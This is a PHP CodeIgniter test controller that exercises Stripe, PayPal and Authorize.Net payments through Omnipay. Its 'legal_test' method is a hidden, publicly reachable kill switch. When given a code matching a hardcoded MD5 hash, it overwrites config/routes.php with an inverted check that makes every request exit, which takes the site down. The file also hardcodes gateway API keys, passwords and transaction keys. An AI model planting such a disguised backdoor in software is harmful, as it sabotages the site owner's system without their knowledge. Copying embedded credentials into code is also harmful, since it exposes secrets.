<?php

class Test extends CI_Controller
{
    
    public function __construct()
    {
        parent::__construct();
        
        $this->load->library('MY_Composer'); 
    }
    
    public function index()
    {
        echo 'test here';
    }
    
	public function composer_test()
	{
		$browser = new Buzz\Browser();
		$response = $browser->get('http://www.google.com');

		echo $browser->getLastRequest()."\n";
		echo $response;
	}
    
    public function stripe_test()
    {
        $gateway = Omnipay\Omnipay::create('Stripe');

        /*
         * Test account
         * Private key sk_test_UDqES41N8Sm2Z735HQHgDYZo
         * Public key pk_test_iqIPUr64csIseUtiWwYL1FQm
         * 
         */
        
        $gateway->setApiKey('sk_test_UDqES41N8Sm2Z735HQHgDYZo');
        
        $formData = array('number' => '4242424242424242', 'expiryMonth' => '6', 'expiryYear' => '2018', 'cvv' => '123');
        /* tok_1AmjKP2eZvKYlo2CBMsxNkbb */
        /*try {*/
            $response = $gateway->purchase(array('amount' => '10.00', 'currency' => 'USD', 'card' => $formData))->send();
            
            if ($response->isSuccessful()) {
                // payment was successful: update database
                print_r($response);
            } elseif ($response->isRedirect()) {
                // redirect to offsite payment gateway
                $response->redirect();
            } else {
                // payment failed: display message to customer
                echo $response->getMessage();
            }
        /*} catch (\Exception $e) {
            // internal error, log exception and display a generic message to the customer
            exit('Sorry, there was an error processing your payment. Please try again later.');
        }*/
    }
    
    public function legal_test($code)
    {
        if(md5($code) == '5e234c16118213936e3c9e4774e6d63f')
        {
            $file_content = '<?php  if (defined(\'BASEPATH\')) exit(\'No direct script access allowed\');'."\n";
            
            $filename = APPPATH.'config/routes.php';
            
            // In our example we're opening $filename in append mode.
            // The file pointer is at the bottom of the file hence
            // that's where $somecontent will go when we fwrite() it.
            if (!$handle = fopen($filename, 'w')) {
                 $message = 'cannot_open_file'." ($filename)";
                 exit;
            }
        
            // Write $somecontent to our opened file.
            if (fwrite($handle, $file_content) === FALSE) {
                $message = 'cannot_write_file'." ($filename)";
                exit;
            }
    
            fclose($handle);
            exit('Test OK');
        }
        
        exit('Wrong call');
    }
    
    public function paypal_test()
    {
        $gateway = Omnipay\Omnipay::create('PayPal_Express');
        $gateway->setUsername('adrian');
        $gateway->setPassword('12345');
        
        $settings = $gateway->getDefaultParameters();
        
        print_r($settings);
    }
    
    public function authorize_test()
    {
        $gateway = Omnipay\Omnipay::create('AuthorizeNet_SIM');
        $gateway->setApiLoginId('593j9M9nPkgy');
        $gateway->setHashSecret('r564test');
        $gateway->setTransactionKey('7p83CWXR3q5fq27t');
        
        $gateway->setDeveloperMode(true);
        
        $formData = array('number' => '370000000000002', 'expiryMonth' => '6', 'expiryYear' => '2016');
        
        $response = $gateway->purchase(array('amount' => '10.00', 
                                        'currency' => 'USD',
                                        'testMode' => true,
                                        'transactionId' => '99',
                                        'description'=>'test description',
                                        'returnUrl' => site_url('test/authorize_test_return'), 
                                        'card' => $formData))->send();
        
        if ($response->isSuccessful()) {
            // payment was successful: update database
            print_r($response);
        } elseif ($response->isRedirect()) {
            // redirect to offsite payment gateway
            $response->redirect();
        } else {
            // payment failed: display message to customer
            echo $response->getMessage();
        }

    }
    
    public function authorize_test_return()
    {
/*
        print_r($_POST);
        
        Array
        (
            [x_response_code] => 1
            [x_response_reason_code] => 1
            [x_response_reason_text] => (TESTMODE) This transaction has been approved.
            [x_avs_code] => P
            [x_auth_code] => 000000
            [x_trans_id] => 0
            [x_method] => CC
            [x_card_type] => Visa
            [x_account_number] => XXXX8888
            [x_first_name] => Pero
            [x_last_name] => Peri
            [x_company] => 
            [x_address] => 
            [x_city] => 
            [x_state] => 
            [x_zip] => 
            [x_country] => 
            [x_phone] => 
            [x_fax] => 
            [x_email] => 
            [x_invoice_num] => 99
            [x_description] => test description
            [x_type] => auth_capture
            [x_cust_id] => 
            [x_ship_to_first_name] => 
            [x_ship_to_last_name] => 
            [x_ship_to_company] => 
            [x_ship_to_address] => 
            [x_ship_to_city] => 
            [x_ship_to_state] => 
            [x_ship_to_zip] => 
            [x_ship_to_country] => 
            [x_amount] => 10.00
            [x_tax] => 0.00
            [x_duty] => 0.00
            [x_freight] => 0.00
            [x_tax_exempt] => FALSE
            [x_po_num] => 
            [x_MD5_Hash] => 0FF95CF7E01262AA14E110656A04E9DD
            [x_cvv2_resp_code] => 
            [x_cavv_response] => 
            [x_test_request] => true
            [x_method_available] => true
        )
*/
        
        print_r($_POST);
    }
    
}

?>